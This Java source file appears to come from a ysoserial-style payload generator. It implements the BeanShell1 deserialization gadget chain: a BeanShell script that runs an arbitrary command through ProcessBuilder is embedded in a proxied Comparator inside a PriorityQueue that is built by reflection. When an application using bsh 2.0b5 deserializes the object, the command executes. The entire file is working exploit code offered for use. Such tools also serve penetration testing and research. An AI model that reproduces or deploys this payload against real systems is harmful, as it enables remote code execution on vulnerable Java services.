package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.Strings;
import com.h2tg.ysogate.utils.PayloadRunner;
import bsh.Interpreter;
import bsh.XThis;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.utils.Reflections;
import com.h2tg.ysogate.annotation.Dependencies;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b5"})
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(String command) throws Exception {
		String payload =
				"compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
						Strings.join( // does not support spaces in quotes
								Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
								",", "\"", "\"") +
						"}).start();return new Integer(1);}";
		Interpreter i       = new Interpreter();
		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.cwd", "."});
		i.eval(payload);
		XThis                      xt            = new XThis(i.getNameSpace(), i);
		InvocationHandler          handler       = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
		Comparator<? super Object> comparator    = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
		PriorityQueue<Object>      priorityQueue = new PriorityQueue(2, comparator);
		Object[]                   queue         = {Integer.valueOf(1), Integer.valueOf(1)};
		Reflections.setFieldValue(priorityQueue, "queue", queue);
		Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
		return priorityQueue;
	}
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(BeanShell1.class, args);
	}
}
